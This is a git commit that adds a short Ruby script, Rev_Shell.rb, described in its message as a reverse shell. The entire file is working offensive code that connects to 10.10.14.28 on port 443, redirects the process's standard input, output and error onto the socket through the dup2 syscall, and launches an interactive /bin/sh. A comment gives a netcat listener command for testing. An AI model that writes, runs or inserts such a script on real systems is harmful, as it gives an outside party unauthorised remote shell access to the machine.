5657952f94b0c01f461be4739a21f0167367b528
Rc1991 <88706869+ZmY7H@users.noreply.github.com>
2021-08-14 02:22:30 -0500

    Create Rev_Shell.rb
    Shell reversa en Ruby

---
+++ Linux/Rev_Shell.rb
@@ -0,0 +1,12 @@
+#!/usr/bin/env ruby
+# syscall 33 = dup2 on 64-bit Linux
+# syscall 63 = dup2 on 32-bit Linux
+# test with nc -lvp 443 
+
+require 'socket'
+
+s = Socket.new 2,1
+s.connect Socket.sockaddr_in 443, '10.10.14.28'
+
+[0,1,2].each { |fd| syscall 33, s.fileno, fd }
+exec '/bin/sh -i'
